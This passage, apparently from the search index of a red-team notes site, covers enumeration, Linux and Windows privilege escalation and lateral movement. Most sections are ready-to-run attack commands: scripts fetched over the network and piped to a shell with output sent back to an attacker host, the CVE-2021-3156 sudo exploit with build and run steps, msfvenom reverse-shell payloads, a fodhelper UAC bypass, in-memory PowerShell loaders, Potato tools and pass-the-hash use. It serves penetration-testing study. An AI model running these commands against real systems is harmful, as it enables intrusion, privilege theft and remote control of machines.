list\n        if ($Service -ne \"\") { $CleanServices += $Service }\n    }\n\n\n    # Get the ACL of each unique, cleaned service path\n    $ACLlist = @()\n    foreach ( $Service in ($CleanServices | Sort-Object -Unique) ) {\n\n        $ACL = Get-Acl -LiteralPath $Service 2&gt;$NULL\n\n        if ($Owner)       { $ACL = $ACL | ? { $_.Owner -like \"*$Owner*\" } }\n        if ($FullControl) { $ACL = $ACL | ? { ($_.Access.FileSystemRights -eq \"FullControl\") -and ($_.Access.IdentityReference -like \"*$FullControl*\") } }\n\n        # Return absolute path instead of ACL\n        if (($OnlyPath -or $Audit) -and $ACL.path) { $ACL = ($ACL.Path).Replace('Microsoft.PowerShell.Core\\FileSystem::','') }\n\n        $ACLlist += $ACL\n    }\n\n    # Check if any services match input parameters\n    if ($ACLlist.Length -eq 0) { return '[-] No services that match the query were found.' }\n\n\n    # Return\n    if ($UnquotedPaths -and $Audit) { return Perform-PathAudit -ServicePaths $ACLlist }\n    else                            { return $ACLlist                                 }\n}\n</code></pre>"},{"location":"Red%20Cell/03.%20Enumeration/WordPress/","title":"WordPress","text":""},{"location":"Red%20Cell/03.%20Enumeration/WordPress/#overview","title":"Overview","text":"<p>WordPress is a web content management system, aimed at providing tools and plugins for website building and developing.</p> <p>Due to the scope of the WordPress ecosystem, the attack surface for WordPress websites is rather large and warrants its own scanner -- this is where WPScan comes into play.</p> <p>Info</p> <p>The\u00a0WPScan\u00a0WordPress security scanner is a CLI tool that uses the WordPress Vulnerability Database API to retrieve WordPress vulnerability data in real time.</p>"},{"location":"Red%20Cell/03.%20Enumeration/WordPress/#enumeration","title":"Enumeration","text":"<p>When enumerating a website, we need to know that WordPress is being used prior to using <code>wpscan</code>.</p> <ul> <li> <p>This can often be given away from <code>nmap</code> scans: </p> </li> <li> <p>Or via browser plugins such as Wappalyzer, which is a valuable tool for determining website backend frameworks and technologies. </p> </li> </ul>"},{"location":"Red%20Cell/03.%20Enumeration/WordPress/#wpscan","title":"WPScan","text":"<p>Once WordPress has been identified, <code>wpscan</code> can be used to find individual plugins, versions, and potentials vulnerabilities.</p> <p>General Usage: <pre><code>wpscan --url &lt;ip_addr&gt;:&lt;port&gt;\n</code></pre></p> <p></p> <ul> <li>Vulnerabilities and versions should be prominently displayed. </li> </ul> <p>Warning</p> <p>It is worth noting that occasionally <code>wpscan</code> can have false negatives, not knowing that specific plugin versions are vulnerable.</p> <ul> <li>Example of <code>wpscan</code> finding a plugin, but not knowing about known exploits. </li> </ul>"},{"location":"Red%20Cell/03.%20Enumeration/adPEAS/","title":"adPEAS","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/03.%20Enumeration/adPEAS/#overview","title":"Overview","text":"<p>adPEAS is a Powershell tool to automate Active Directory enumeration. In fact, adPEAS is like a wrapper for different other cool projects like</p> <ul> <li>PowerView</li> <li>PoshADCS</li> <li>Bloodhound</li> <li>and some own written lines of code</li> </ul> <p>As said, adPEAS is a wrapper for other tools. They are almost all written in pure Powershell but some of them are included as compressed binary blob or C# code.</p> <p>adPEAS-Light is a version without Bloodhound and it is more likely that it will not blocked by an AV solution.</p> <p>Link: adPEAS</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/","title":"Privilege Escalation","text":"<ul> <li>Privilege escalation is the act gaining higher levels of access or permissions on a computer system or network in order to perform actions that would normally be restricted.</li> </ul>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/#table-of-contents","title":"Table of Contents","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/#linux","title":"Linux","text":"<ul> <li>GTFOBins</li> <li>LinPEAS</li> <li>Sudo Misconfiguration</li> <li>Sudo Version</li> <li>SUID Bit</li> </ul>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/#windows","title":"Windows","text":"<ul> <li>AlwaysInstallElevated</li> <li>DLL Hijacking</li> <li>Local Administrator (UAC Bypasses)</li> <li>PowerUp.ps1</li> <li>PsExec</li> <li>SeImpersonatePrivilege</li> <li>Unquoted Service Paths</li> <li>winPEAS</li> </ul>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/GTFOBins/","title":"GTFOBins","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/GTFOBins/#overview","title":"Overview","text":"<p>GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems (i.e., privilege escalate).</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/GTFOBins/#general-usage","title":"General Usage","text":"<p>Once you find a potentially vulnerable binary, cross reference GTFOBins for exploitation vectors.</p> <p></p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/LinPEAS/","title":"LinPEAS","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/LinPEAS/#overview","title":"Overview","text":"<p>When all else fails and your back is against the wall, you can use <code>LinPEAS</code> from the PEASS-ng project and be bombarded with more information than you could ever want.</p> <p>Warning</p> <p>Be prepared for a gratuitous amount of false positives.</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/LinPEAS/#general-usage","title":"General Usage","text":"<pre><code># From github\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Local network\nsudo python3 -m http.server 80 #Host\ncurl 10.10.10.10/linpeas.sh | sh #Victim\n\n# Without curl\nsudo nc -q 5 -lvnp 80 &lt; linpeas.sh #Host\ncat &lt; /dev/tcp/10.10.10.10/80 | sh #Victim\n\n# Excute from memory and send output back to the host\nnc -lvnp 9002 | tee linpeas.out #Host\ncurl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim\n</code></pre>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/SUID%20Bit/","title":"SUID Bit","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/SUID%20Bit/#overview","title":"Overview","text":"<p>Another quick and easy privilege escalation method is to check if any known programs contain the set-UID bit that may retain privileges.</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/SUID%20Bit/#exploitation-example","title":"Exploitation Example","text":"<ul> <li> <p>The following command(s) can be used to determine if the SUID bit is set: <pre><code># The program will run as the owner of the file\nfind / -perm -4000 2&gt;/dev/null \n# The program will run as the group of the file \nfind / -perm -2000 2&gt;/dev/null \n# The program will run as both the owner and the group \nfind / -perm -6000 2&gt;/dev/null\n</code></pre></p> </li> <li> <p>If any common binaries are found, cross-reference https://gtfobins.github.io/#+suid to see if there are any known exploits.</p> </li> </ul> <p> </p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/Sudo%20Misconfiguration/","title":"Sudo Misconfiguration","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/Sudo%20Misconfiguration/#overview","title":"Overview","text":"<ul> <li>One of the easiest and quickest privilege escalation techniques is to check if there is a vulnerable misconfiguration in the <code>/etc/sudoers</code> file.  This file indicates what binaries can be ran with elevated privileges, meaning if specifically vulnerable binaries are allowed to be executed with sudo it could potentially result in privilege escalation.</li> </ul>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/Sudo%20Misconfiguration/#exploitation-example","title":"Exploitation Example","text":"<ul> <li> <p>For this method, the user's password must be known\u00a0OR\u00a0the user must have the <code>NOPASSWD</code> flag set in <code>/etc/sudoers</code>. <pre><code># EVERYTHING ran but requires knowing the user's password\nroot ALL=(ALL:ALL) ALL \n\n# EVERYTHING ran without a password \nuser1 ALL=(ALL:ALL) NOPASSWD: ALL\n\n# SPECIFIC program doesn't require a password \nuser2 ALL=(ALL:ALL) NOPASSWD: /usr/bin/vi\n</code></pre></p> </li> <li> <p>Check current sudo privileges and sudo-able programs that don't require passwords: <pre><code>sudo -l\n</code></pre></p> </li> <li> <p>If any common binaries are specified, cross-reference https://gtfobins.github.io/#+sudo to see if there are any known exploits. </p> </li> <li> <p>If <code>(ALL : ALL) ALL</code> is specified, you can escalate to the root user using <code>sudo su</code> if you know the current user's password. </p> </li> </ul>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/Sudo%20Version/","title":"Sudo Version","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/Sudo%20Version/#overview","title":"Overview","text":"<p>While much less common, this method can still occasionally offer an avenue of escalation.  If the <code>sudo</code> version is old enough, sometimes you can find known overflow vulnerabilities for privilege escalation.</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Linux/Sudo%20Version/#exploitation-example","title":"Exploitation Example","text":"<ul> <li>Check sudo version for potential to reference potential known exploits <pre><code>sudo -V\nsearchsploit sudo\n</code></pre></li> </ul> <p>Example CVE: - CVE-2021-3156: Sudo Heap Overflow Vulnerability - POC: https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156_one_shot</p> <p>The flaw was introduced in July 2011 and affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1, in their default configuration.</p> <pre><code>sudoedit -s '\\' `perl -e 'print \"A\" x 65536'`\n</code></pre> <p>Walkthrough: <pre><code>### On Victim ###\n\n# Check sudo version\nsudo -V\n...\nSudo version 1.8.21p2\nSudoers policy plugin version 1.8.21p2\nSudoers file grammar version 46\nSudoers I/O plugin version 1.8.21p2\n...\n\n# Verify Host is Vulnerable to CVE-2021-3156\nsudoedit -s '\\' `perl -e 'print \"A\" x 65536'`\n# If you receive a usage or error message, sudo is not vulnerable. \n# If the result is a Segmentation fault, sudo is vulnerable.\n</code></pre></p> <p><pre><code>### On Attacker ###\ngit clone https://github.com/r4j0x00/exploits\ncd exploits/CVE-2021-3156_one_shot\ncat Makefile\n</code></pre> </p> <p>To avoid dependency issues, we'll need to compile the exploit statically instead of just using the <code>Makefile</code>.</p> <p><pre><code># Statically compile Exploit and Compress for Trasfer to Victim\ngcc -static exploit.c -o exploit\nmkdir libnss_X\ngcc -g -fPIC -shared sice.c -o libnss_X/X.so.2\ntar -czvf exploit.tar.gz exploit libnss_X/\n</code></pre> </p> <p>Once the exploit is compressed, move the archive to the victim machine in whatever way you want, expand it, and execute it to elevate to <code>root</code></p> <pre><code>### On Victim ###\n\n# Expand archive and exploit\ntar -xzvf exploit.tar.gz\n./exploit\n\n# You are now root\n</code></pre>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/AlwaysInstallElevated/","title":"AlwaysInstallElevated","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/AlwaysInstallElevated/#overview","title":"Overview","text":"<p><code>AlwaysInstallElevated</code> registry keys guarantee that MSI files always execute as SYSTEM (even if an unprivileged user runs them).</p> <p>Key Paths: <pre><code>HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\n</code></pre></p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/AlwaysInstallElevated/#exploitation-example","title":"Exploitation Example","text":"<p><code>Invoke-PrivEscAudit</code> from <code>PowerUp.ps1</code> can output potential exploitation vectors, including <code>AlwaysInstallElevated</code>.</p> <p>Info</p> <p><code>PowerUp.ps1</code> provides scripts to exploit this, but this example will do it manually.</p> <p></p> <p>Manual Exploitation: - Create a reverse shell MSI to execute on the victim. <pre><code># Create Reverse Shell MSI\nmsfvenom -p windows/powershell_reverse_tcp LHOST=&lt;attacker_ip&gt; LPORT=&lt;listening_port&gt; -f msi &gt; powershell_payload.msi\n\n### Move binary to victim however you want ###\n</code></pre></p> <pre><code>### On Victim ###\n# Execute MSI to establish SYSTEM level reverse shell\nmsiexec /q /i powershell_payload.msi\n</code></pre>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/DLL%20Hijacking/","title":"DLL Hijacking","text":"<p>Warning</p> <p>This note is still in development!</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/Local%20Administrator%20%28UAC%20Bypasses%29/","title":"Local Administrator (UAC Bypasses)","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/Local%20Administrator%20%28UAC%20Bypasses%29/#overview","title":"Overview","text":"<p>A compromised user may not be the Administrator user, but they may still be in the Local Administrators group.  Exploiting this requires a UAC bypass to execute commands and programs elevated.</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/Local%20Administrator%20%28UAC%20Bypasses%29/#exploitation-example","title":"Exploitation Example","text":"<ul> <li> <p>There are an abundance of UAC bypasses; too many to cover.  Nothing is guaranteed to work, so you just have to find out what UAC bypass is possible on your compromised host.</p> </li> <li> <p>Example UAC Bypasses:</p> <ul> <li><code>Invoke-EventVwrBypass</code> (part of <code>PowerUp.ps1</code>)</li> <li><code>UACMe</code> (https://github.com/hfiref0x/UACME)</li> <li><code>FodHelper.exe</code> UAC Bypass (example below)</li> </ul> </li> </ul> <p>FodHelper UAC Bypass: - Requirements <pre><code># Validate session is 64-bit\n[Environment]::Is64BitProcess\n\n# If above command returns \"False\", create new 64-bit session\nwmic.exe process call create \"powershell -nop -ex bypass -e &lt;encoded_powershell_reverse_shell&gt;\"\n</code></pre> - Exploit <pre><code># Payload to execute\n$RevShell = \"powershell -nop -ex bypass -e &lt;encoded_powershell_reverse_shell&gt;\"\n\n# Create registry structure\nNew-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value $RevShell -Force\n\n# Perform the UAC bypass\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden\n</code></pre></p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/PowerUp.ps1/","title":"PowerUp.ps1","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/PowerUp.ps1/#overview","title":"Overview","text":"<p><code>PowerUp.ps1</code> is a Privilege Escalation-based PowerShell module part of the PowerSploit project, and it comes native on Kali Linux.  It contains a plethora of PowerShell scripts meant to exploit specific privilege escalation vulnerabilities, but it's most valuable script is <code>Invoke-PrivEscAudit</code> (or the alias <code>Invoke-AllChecks</code>) which quickly and succinctly scrubs the host for potential privilege escalation vectors, as well as provides recommendations for how to abuse found vulnerabilities.</p> <p>Info</p> <p>While not as massive and verbose as <code>winPEAS</code>, it is much more succinct and not overwhelming with information.</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/PowerUp.ps1/#general-usage","title":"General Usage","text":"<pre><code>### On Attacker ###\n\n# Default Kali Location:\n# /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1\n\n# Create a Simple Web Server Hosting Scripts\npython -m http.server --directory /usr/share/windows-resources/powersploit/Privesc\n</code></pre> <pre><code>### On Victim ###\n\n# Download Script to Disk\niwr 'http://&lt;ip_addr&gt;:8000/PowerUp.ps1' -o PowerUp.ps1 -UseBasicParsing\n. PowerUp.ps1\n\n# OR Load Script into Memory\niex ([System.Net.WebClient]::new().DownloadString('http://&lt;ip_addr&gt;:8000/PowerUp.ps1'))\n\n# Check for Privilege Escalation vectors\nInvoke-PrivEscAudit # or Invoke-AllChecks (alias)\n</code></pre>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/PsExec/","title":"PsExec","text":"<p>This note falls under both Privilege Escalation and Lateral Movement.</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/PsExec/#overview","title":"Overview","text":"<p>PsExec allows you to execute processes on remote systems, providing a way to run commands or launch programs on another computer over a network.  PsExec allows a user to acquire a SYSTEM level shell via exploiting write privileges in the default <code>C$</code> or <code>ADMIN$</code> share.</p> <p>This means that if you can access the <code>C$</code> or <code>ADMIN$</code> share on a system, you can elevated your privileges to NT AUTHORITY/SYSTEM.</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/PsExec/#usage","title":"Usage","text":"<p>There are multiple different ways to utilize PsExec on a target.</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/PsExec/#sysinternals-suite-psexecexe","title":"Sysinternals Suite (<code>psexec.exe</code>)","text":"<ul> <li>Link: https://learn.microsoft.com/en-us/sysinternals/</li> <li>Must be ran on a Windows host.</li> </ul> <pre><code># Accept EULA\n.\\psexec.exe -accepteula\n\n# Execute a PowerShell reverse shell payload on a remote system as SYSTEM\n.\\psexec.exe \\\\&lt;target_host&gt; -u &lt;admin_user&gt; -p &lt;admin_pass&gt; -s -i powershell.exe -e &lt;base64_payload&gt;\n\n# Copy a binary to a remote system and execute it as SYSTEM\n.\\psexec.exe \\\\&lt;target_host&gt; -u &lt;admin_user&gt; -p &lt;admin_pass&gt; -s -i -c &lt;binary&gt;.exe\n\n# User to Run As                   : -u\n# Password of Executing User       : -p\n# Execute as NT AUTHORITY/SYSTEM   : -s\n# Execute Interactively            : -i\n# Copy Local Binary and Execute It : -c\n</code></pre>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/PsExec/#impacket-psexec","title":"impacket-psexec","text":"<ul> <li>Link: https://github.com/fortra/impacket</li> <li><code>impacket-psexec</code> is the Kali Linux alias for impacket's <code>psexec.py</code> script.</li> </ul> <pre><code># Psexec via Password\nimpacket-psxec &lt;domain&gt;/&lt;username&gt;:'&lt;password&gt;'@&lt;target&gt;\n\n# Psexec via Pass-the-Hash\nimpacket-psexec &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; -hashes &lt;ntlm&gt;:&lt;ntlm&gt;\n\n# Psexec via Kerberos Ticket\nexport KRB5CCNAME=/path/to/&lt;krb5cc_ticket&gt;\nimpacket-psexec &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; -k -no-pass\n\n# Optional: add a specific command to execute (default: cmd.exe)\nimpacket-psxec &lt;domain&gt;/&lt;username&gt;:'&lt;password&gt;'@&lt;target&gt; '&lt;command_to_execute&gt;'\n\n# Return Help                    : help\n# Execute Local Commands         : !&lt;local_command&gt;\n# Upload Files to Temp Directory : lput &lt;local_file&gt; Temp\n</code></pre>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/PsExec/#manual-execution-via-sc","title":"Manual Execution via SC","text":"<ul> <li>This requires no credentials, but write privileges to the ADMIN$ / C$ share.</li> </ul> <pre><code># Copy binary to the ADMIN$ share of a host\ncopy payload.exe \\\\&lt;target_host&gt;\\ADMIN$\n\n# Create and start a service pointing to uploaded binary\nsc \\\\&lt;target_host&gt; create servicename binPath= \"C:\\Windows\\payload.exe\"\nsc \\\\&lt;target_host&gt; start servicename\n</code></pre> <p>(Note: The space in <code>binPath= \"C:\\Windows\\payload.exe\"</code> is intended.)</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/SeImpersonatePrivilege/","title":"SeImpersonatePrivilege","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/SeImpersonatePrivilege/#overview","title":"Overview","text":"<p><code>SeImpersonatePrivilege</code> rights allow that user to\u00a0\"permit programs that run on behalf of that user to impersonate a client\".  Specifically, exploiting this allows us to run commands and programs as SYSTEM.</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/SeImpersonatePrivilege/#exploitation-example","title":"Exploitation Example","text":"<ul> <li><code>SeImpersonatePrivilege</code> rights can be checked by running <code>whoami /priv</code>.</li> </ul> <ul> <li>To exploit this, we need to copy some tools to the victim.  Some common Potatoes exploiting <code>SeImpersonatePrivilege</code> listed below:<ul> <li>https://github.com/tylerdotrar/SigmaPotato (plugging my own repository)</li> <li>https://github.com/BeichenDream/GodPotato</li> <li>https://github.com/itm4n/PrintSpoofer</li> <li>https://github.com/zcgonvh/EfsPotato</li> </ul> </li> </ul> <p>Info</p> <ul> <li>Successful execution of some of these tools can depend on what .NET version is installed on the host, what version of Windows is running, etc.  With that said, that means you may have to try a couple different executables.<ul> <li>PrintSpoofer works with Windows 10 and Windows Server 2016 - 2019 boxes.</li> <li>SigmaPotato is the newest entry to the potato family and works on Windows 8 - Windows 11 and Windows Server 2012 - 2022 systems.</li> </ul> </li> </ul> <p>Example Usage: <pre><code># PrintSpoofer executing a PowerShell reverse shell payload\n.\\PrintSpoofer.exe -c \"powershell -e &lt;encoded_powershell_reverse_shell&gt;\"\n\n# SigmaPotato executing a PowerShell reverse shell payload\n.\\SigmaPotato.exe --revshell &lt;attacker_ip&gt; &lt;listening_port&gt;\n\n# (Advanced Method) Load SigmaPotato into memory \n[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData(\"http(s)://&lt;ip_addr&gt;/SigmaPotato.exe\"))\n\n# (Advanced Method) Execute Command as SYSTEM from memory\n[SigmaPotato]::Main('&lt;command&gt;')\n</code></pre></p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/Unquoted%20Service%20Paths/","title":"Unquoted Service Paths","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/Unquoted%20Service%20Paths/#overview","title":"Overview","text":"<p>Service binaries that contain spaces in the path but lack quotations can be exploited by placing malicious binaries earlier in the path (assuming the path is writeable).</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/Unquoted%20Service%20Paths/#exploitaiton-example","title":"Exploitaiton Example","text":"<ul> <li><code>Invoke-PrivEscAudit</code> from <code>PowerUp.ps1</code> can output potential exploitation vectors, including unquoted service binaries with writeable paths.</li> </ul> <p>Info</p> <p><code>PowerUp.ps1</code> provides scripts to exploit this, but this example will do it manually.</p> <p></p> <p>Manual Exploitation: - Create a reverse shell binary that exploits the spaces within the service path. <pre><code># Vulnerable Service Path\nC:\\Program Files (x86)\\TRIGONE\\Remote System Monitor Server\\RemoteSystemMonitorService.exe\n</code></pre></p> <pre><code>### On Attacker ###\n# Create Reverse Shell Binary\nmsfvenom -p windows/shell/reverse_tcp -f exe LHOST=&lt;attacker_ip&gt; LPORT=&lt;listening_port&gt; &gt; Remote.exe\n\n### Move binary to victim however you want ###\n</code></pre> <pre><code>### On Victim ###\n# Copy binary to vulnerable path\ncp Remote.exe \"C:\\Program Files (x86)\\TRIGONE\\Remote.exe\"\n\n# Restart computer if you don't have permissions to restart the service\nshutdown /r /t 3\n</code></pre>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/winPEAS/","title":"winPEAS","text":""},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/winPEAS/#overview","title":"Overview","text":"<p>When all else fails and your back is against the wall, you can use <code>winPEAS</code> from the PEASS-ng project and be bombarded with more information than you could ever want.</p> <p>Warning</p> <p>Be prepared for a gratuitous amount of false positives.</p>"},{"location":"Red%20Cell/04.%20Privilege%20Escalation/Windows/winPEAS/#download-links","title":"Download Links","text":"<pre><code># Download most recent WinPEAS executable\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe\n\n# Download most recent WinPEAS batch script\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat\n</code></pre>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/","title":"Tunneling &amp; Lateral Movement","text":"<ul> <li>Tunneling (specifically proxying) is a technique that facilitates secure data transfer through encrypted channels, often used for lateral movement within a compromised network. It allows attackers to navigate by moving through an intermediate target to gain access to further network resources while evading detection.</li> </ul>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/#table-of-contents","title":"Table of Contents","text":""},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/#lateral-movement","title":"Lateral Movement","text":"<ul> <li>PsExec</li> <li>RDP</li> <li>RunasCS</li> <li>schtasks</li> <li>wmic</li> </ul>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/#tunneling","title":"Tunneling","text":"<ul> <li>Chisel</li> <li>netsh</li> <li>SSH</li> </ul>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/PsExec/","title":"PsExec","text":"<p>This note falls under both Privilege Escalation and Lateral Movement.</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/PsExec/#overview","title":"Overview","text":"<p>PsExec allows you to execute processes on remote systems, providing a way to run commands or launch programs on another computer over a network.  PsExec allows a user to acquire a SYSTEM level shell via exploiting write privileges in the default <code>C$</code> or <code>ADMIN$</code> share.</p> <p>This means that if you can access the <code>C$</code> or <code>ADMIN$</code> share on a system, you can elevated your privileges to NT AUTHORITY/SYSTEM.</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/PsExec/#usage","title":"Usage","text":"<p>There are multiple different ways to utilize PsExec on a target.</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/PsExec/#sysinternals-suite-psexecexe","title":"Sysinternals Suite (<code>psexec.exe</code>)","text":"<ul> <li>Link: https://learn.microsoft.com/en-us/sysinternals/</li> <li>Must be ran on a Windows host.</li> </ul> <pre><code># Accept EULA\n.\\psexec.exe -accepteula\n\n# Execute a PowerShell reverse shell payload on a remote system as SYSTEM\n.\\psexec.exe \\\\&lt;target_host&gt; -u &lt;admin_user&gt; -p &lt;admin_pass&gt; -s -i powershell.exe -e &lt;base64_payload&gt;\n\n# Copy a binary to a remote system and execute it as SYSTEM\n.\\psexec.exe \\\\&lt;target_host&gt; -u &lt;admin_user&gt; -p &lt;admin_pass&gt; -s -i -c &lt;binary&gt;.exe\n\n# User to Run As                   : -u\n# Password of Executing User       : -p\n# Execute as NT AUTHORITY/SYSTEM   : -s\n# Execute Interactively            : -i\n# Copy Local Binary and Execute It : -c\n</code></pre>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/PsExec/#impacket-psexec","title":"impacket-psexec","text":"<ul> <li>Link: https://github.com/fortra/impacket</li> <li><code>impacket-psexec</code> is the Kali Linux alias for impacket's <code>psexec.py</code> script.</li> </ul> <pre><code># Psexec via Password\nimpacket-psxec &lt;domain&gt;/&lt;username&gt;:'&lt;password&gt;'@&lt;target&gt;\n\n# Psexec via Pass-the-Hash\nimpacket-psexec &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; -hashes &lt;ntlm&gt;:&lt;ntlm&gt;\n\n# Psexec via Kerberos Ticket\nexport KRB5CCNAME=/path/to/&lt;krb5cc_ticket&gt;\nimpacket-psexec &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; -k -no-pass\n\n# Optional: add a specific command to execute (default: cmd.exe)\nimpacket-psxec &lt;domain&gt;/&lt;username&gt;:'&lt;password&gt;'@&lt;target&gt; '&lt;command_to_execute&gt;'\n\n# Return Help                    : help\n# Execute Local Commands         : !&lt;local_command&gt;\n# Upload Files to Temp Directory : lput &lt;local_file&gt; Temp\n</code></pre>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/PsExec/#manual-execution-via-sc","title":"Manual Execution via SC","text":"<ul> <li>This requires no credentials, but write privileges to the ADMIN$ / C$ share.</li> </ul> <pre><code># Copy binary to the ADMIN$ share of a host\ncopy payload.exe \\\\&lt;target_host&gt;\\ADMIN$\n\n# Create and start a service pointing to uploaded binary\nsc \\\\&lt;target_host&gt; create servicename binPath= \"C:\\Windows\\payload.exe\"\nsc \\\\&lt;target_host&gt; start servicename\n</code></pre> <p>(Note: The space in <code>binPath= \"C:\\Windows\\payload.exe\"</code> is intended.)</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/RDP/","title":"RDP","text":"<p>Tip</p> <p>This note is a work-in-progress.</p> <pre><code># Connect via RDP\nxfreerdp /v:&lt;ip_address&gt;:&lt;port&gt; /u:&lt;user&gt; /p:&lt;password&gt; /dynamic-resolution +clipboard\n\n# Pass-The-Hash (NTLM)\nxfreerdp /u:&lt;user&gt; /pth:&lt;ntlm_hash&gt; /v:&lt;ip_address&gt;\n\n# Example: PTH in a domain through a proxy\nproxychains xfreerdp /:Joe.Schmoe /d:example.com /pth:1234qwer1234qwer1234 /v:192.168.1.10\n</code></pre>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/RunasCS/","title":"RunasCS","text":"<p>(Thank you @numonce)</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/RunasCS/#overview","title":"Overview:","text":"<p>Link: https://github.com/antonioCoco/RunasCs</p> <p>Often times we have credentials for another user, but are unable to switch to or run commands as the user. RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin runas.exe that solves some limitations:</p> <ul> <li>Allows explicit credentials</li> <li>Works both if spawned from interactive process and from service process</li> <li>Manage properly DACL for Window Stations and Desktop for the creation of the new process</li> <li>Uses more reliable create process functions like <code>CreateProcessAsUser()</code> and <code>CreateProcessWithTokenW()</code> if the calling process holds the required privileges (automatic detection)</li> <li>Allows to specify the logon type, e.g. 8-NetworkCleartext logon (no UAC limitations)</li> <li>Allows to bypass UAC when an administrator password is known (flag --bypass-uac)</li> <li>Allows redirecting stdin, stdout and stderr to a remote host</li> <li>It's Open Source :)</li> </ul>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/RunasCS/#usage","title":"Usage","text":"<pre><code>RunasCs v1.5 - @splinter_code\n\nUsage:\n    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] 